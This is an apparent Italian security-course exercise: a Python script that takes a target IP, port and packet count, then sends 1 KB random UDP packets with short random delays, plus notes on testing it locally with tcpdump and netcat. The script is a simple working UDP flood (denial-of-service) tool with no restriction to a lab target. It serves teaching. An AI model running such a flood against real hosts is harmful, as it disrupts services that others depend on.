'''

Traccia:
Gli attacchi di tipo DDoS, ovvero Distributed Denial of Services,
mirano a saturare le richieste di determinati servizi rendendoli così indisponibili
con conseguenti impatti sul business delle aziende.
L'esercizio di oggi è scrivere un programma in Python che simuli un UDP flood,
ovvero l'invio massivo di richieste UDP verso una macchina target che è 
in ascolto su una porta UDP casuale (nel nostro caso un DoS.

Requisiti:

-Il programma deve richiedere l'inserimento dell'IP target (input)
-Il programma deve richiedere l'inserimento della porta target (input)
-La grandezza dei pacchetti da inviare è di 1 KB per pacchetto 

- Suggerimento: per costruire il pacchetto da 1KB potete utilizzare 
il modulo «random» per la generazione di byte casuali.

-Il programma deve chiedere all'utente quanti pacchetti da 1 KB inviare (input)


'''

import socket as so
import random
import time

# Input dell'IP target
ip = input("Inserisci l'IP target: ")

# Input della porta target
while True:
    try:
        porta = int(input("Inserisci la porta target: "))
        if 1 <= porta <= 65535:  # Verifica range valido delle porte
            break
        else:
            print("Errore: La porta deve essere tra 1 e 65535")
    except ValueError:  # Gestisce input non numerici
        print("Errore: Inserisci un numero valido per la porta")

# Input del numero di pacchetti
while True:
    try:
        n_pack = int(input("Quanti pacchetti da 1KB vuoi inviare? "))
        if n_pack > 0:  # Verifica che sia maggiore di zero
            break
        else:
            print("Errore: Il numero di pacchetti deve essere maggiore di 0")
    except ValueError:  # Gestisce input non numerici
        print("Errore: Inserisci un numero valido per i pacchetti")

# Creazione socket UDP
s = so.socket(so.AF_INET, so.SOCK_DGRAM)  # AF_INET=IPv4, SOCK_DGRAM=UDP
s.connect((ip, int(porta)))  # Imposta destinatario predefinito

# Loop di invio pacchetti con ritardo casuale
for p in range(n_pack):
    packet = random.randbytes(1024)  # Genera 1KB di dati casuali
    s.send(packet)  # Invia il pacchetto
    print(f"Inviato pacchetto {p + 1}/{n_pack} a {ip}:{porta}") # feedback per l'utente
# che mostra in tempo reale cosa sta succedendo durante l'invio dei pacchetti.
    
# Genera ritardo casuale tra 0 e 100 millisecondi
    time_casuale = random.randint(0, 100)  # Numero intero 0-100
    time_casuale = float(time_casuale) / 1000.0  # Converti in secondi
    print(f"Ritardo casuale di {time_casuale:.2f} secondi prima dell'invio del pacchetto {p + 1}")
    time.sleep(time_casuale)  # Applica il ritardo

s.close()  # Chiude il socket
print("Tutti i pacchetti sono stati inviati.")


"""

UDP Flood Simulator

COME TESTARE IL PROGRAMMA:
=========================

1. Avviare tcpdump per monitorare il traffico:
   sudo tcpdump -i lo udp port 8080 -w test_udp.pcap

2. In un altro terminale, avviare netcat come listener:
   nc -u -l -p 8080

3. Eseguire questo script:
   nome_file.py

4. Analizzare i risultati:
   tcpdump -r test_udp.pcap -ttt

"""